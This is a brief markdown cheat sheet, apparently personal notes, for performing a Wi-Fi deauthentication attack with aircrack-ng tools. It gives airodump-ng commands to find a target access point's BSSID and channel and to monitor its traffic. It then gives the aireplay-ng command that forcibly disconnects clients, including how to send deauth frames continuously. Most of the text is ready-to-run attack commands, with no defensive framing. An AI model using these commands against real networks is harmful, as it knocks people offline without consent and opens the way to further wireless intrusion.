# Deauthentication Attack
1.  Gather MAC addresses
Use airmon-ng to see live network traffic, remember to add `--band a` for 5GHz: 
```
sudo airodump-ng wlan1mon --band abg -w dump
```
- Note the APs BSSID + channel

### Monitor traffic
Once you've found your target, listen to it live with:
```
sudo airodump-ng wlan1mon --bssid XX:XX:XX:XX:XX:XX --band abg -c X
```
OR (try both - router likely broadcasts multiple BSSIDs, once for each GHz or if it multiplate bands(?))
```
sudo airodump-ng wlan1mon --essid "NetworkName" --band abg
```

---

### Deauth
The actual deauth - where `5` is the number of deauths, `0` would be to send them continously.
```
sudo aireplay-ng -0 5 -a ACCESSPOINT-BSSID -c CLIENT-BSSID wlan1mon
```

---

## -- NOTES
You have to be on the same channel as the AP you're deauthing, change it with:
```
iwconfig wlan1mon channel 149
```

---
### For list of attacks:
We want `0` here
```
sudo aireplay-ng
```
